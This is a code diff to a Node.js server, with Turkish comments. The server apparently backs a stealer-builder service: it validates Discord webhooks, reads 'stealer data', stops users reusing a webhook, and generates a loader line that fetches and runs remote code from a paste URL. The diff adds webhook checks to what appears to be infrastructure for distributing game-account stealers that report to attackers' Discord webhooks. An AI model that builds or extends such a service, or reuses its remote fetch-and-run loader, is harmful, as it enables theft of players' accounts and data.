@@ -656,7 +656,14 @@ app.get('/api/webhook/validate/*', async (req, res) => {
     }
 
     try {
+      // Discord API ile webhook'u doğrula
       const response = await axios.get(webhook);
+      
+      // Discord webhook response'u check et
+      if (!response.data || !response.data.id) {
+        return res.status(400).json({ success: false, message: 'Invalid Discord webhook format' });
+      }
+
       res.json({ 
         success: true, 
         message: 'Webhook is valid',
@@ -664,7 +671,7 @@ app.get('/api/webhook/validate/*', async (req, res) => {
       });
     } catch (error) {
       if (error.response?.status === 404) {
-        return res.status(400).json({ success: false, message: 'Webhook not found' });
+        return res.status(400).json({ success: false, message: 'Webhook not found or invalid' });
       }
       res.status(400).json({ success: false, message: 'Invalid Discord webhook' });
     }
@@ -789,10 +796,25 @@ app.post('/api/script/generate/:webhook/:game', async (req, res) => {
       return res.status(400).json({ success: false, message: 'Webhook URL required' });
     }
 
+    // Webhook'u Discord API ile doğrula
     try {
-      await axios.get(webhook);
+      const webhookValidation = await axios.get(webhook);
+      if (!webhookValidation.data || !webhookValidation.data.id) {
+        return res.status(400).json({ success: false, message: 'Invalid Discord webhook' });
+      }
     } catch (error) {
-      return res.status(400).json({ success: false, message: 'Invalid webhook' });
+      return res.status(400).json({ success: false, message: 'Invalid or expired webhook' });
+    }
+
+    // Webhook'un bu user'a ait bir scriptte zaten kullanılıp kullanılmadığını kontrol et
+    const data = await getStealerData();
+    const existingScripts = (data.scripts || []).filter(s => s.userId === userId && s.webhook === webhook);
+    
+    if (existingScripts.length > 0) {
+      return res.status(400).json({ 
+        success: false, 
+        message: 'This webhook has already been used. Please use a different Discord webhook.' 
+      });
     }
 
     let protectionId = null;
@@ -822,7 +844,6 @@ app.post('/api/script/generate/:webhook/:game', async (req, res) => {
     const loadstringCode = `loadstring(game:HttpGet("${pasteData.rawUrl}"))()`;
 
     try {
-      const data = await getStealerData();
       let scripts = data.scripts || [];
 
       scripts.push({
